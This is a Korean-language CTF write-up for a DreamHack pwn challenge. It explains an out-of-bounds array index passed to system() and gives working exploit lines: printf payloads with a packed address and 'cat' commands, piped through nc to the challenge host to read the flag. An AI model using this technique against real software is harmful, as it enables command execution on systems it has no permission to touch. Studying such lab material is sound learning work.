---
ctf_name: "DreamHack Wargame"
challenge_name: "out-of-bound"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty: "easy"      # easy / medium / hard / insane
author: "laneeeey"
date: "2026-05-06"
points: 14
tags: [out-of-bound]
---

# 문제명

## 문제 설명

> 사용자의 입력을 받아 미리 정의된 명령어 배열 중 하나를 실행하는 프로그램이다.

- 문제 파일: `out_of_bound`
- 접속 정보: `nc host8.dreamhack.games 14987`

## 풀이

### 분석

### 분석

command 배열의 크기는 10이므로 유효한 인덱스는 0-9이다. 
그러나 입력받은 idx에 대한 범위 검사가 없어 배열 바깥의 메모리를 참조할 수 있다.

name은 사용자가 값을 입력할 수 있는 전역 변수이다. 
따라서 OOB 접근으로 command[idx]가 name영역을 읽고 name에 명령어 문자열의 주소와 실제 명령어를 배치하면 system()을 통해 원하는 명령어를 실행할 수 있다.

### 취약점

```c
scanf("%d", &idx);
system(command[idx]);
```
idx에 대한 검증이 없기때문에 out-of-bounds 배열 접근이 가능하다.
command[idx]는 문자열 자체가 아닌 문자열이 저장된 주소를 의미해 배열 밖 메모리를 참조했을 때 원하는 문자열의 주소가 저장되어 있다면 system()이 해당 문자열을 명령어로 실행하게 된다.

name에 명령어 문자열의 주소와 실제 명령어를 저장한 뒤 command[idx]가 name에 저장된 주소를 포인터로 해석하게하면 원하는 명령어를 실행할 수 있다.
### 익스플로잇

nm -n ./out_of_bound | grep -E "command|name"
명령어로 command와 name의 주소를 확인하기 했다.

0804a060 D command
0804a0ac B name
실행결과를 통해 command의 주소는 0x0804a060, name의 주소는 0x0804a0ac임을 알게 됐다.

command[idx]가 name의 시작 주소를 참조하기 위해 (name - command) / 4를 계산하면 idx는 19이다.

명령어 문자열은 name + 4위치부터 저장할 것이니 name + 4의 주소 0x0804a0b0를 리틀엔디안 방식으로 \xb0\xa0\x04\x08을 넣었다.

처음에는 /flag 경로에 flag 파일이 있을 것이라 생각해
(printf '\xb0\xa0\x04\x08cat /flag\000AA'; printf '19\n') | nc host8.dreamhack.games 14987
을 실행했지만 
Admin name: What do you want?:
으로 flag가 출력되지 않았다.

따라서 flag 파일이 /flag 경로에 존재하지 않는다고 판단 후 현재 디렉토리에서 f로 시작하는 파일을 읽기 위해
(printf '\xb0\xa0\x04\x08cat f*\000AAAAA'; printf '19\n') | nc host8.dreamhack.games 14987
을 실행해 flag를 얻을 수 있었다.

## 플래그

```
flag{REDACTED}
```

## 배운 점

system(command[idx])에서 중요한 것은 명령어 문자열 자체가 아니라 문자열을 가리키는 포인터라는 점이다.
name에 명령어만 넣는 것이 아니라, 명령어 문자열의 주소와 실제 명령어 문자열을 함께 배치해야 했다.
또한 32비트 바이너리에서는 포인터 크기가 4바이트이므로, idx 계산과 주소 packing 모두 4바이트 기준으로 해야 한다는 것을 경험했다.
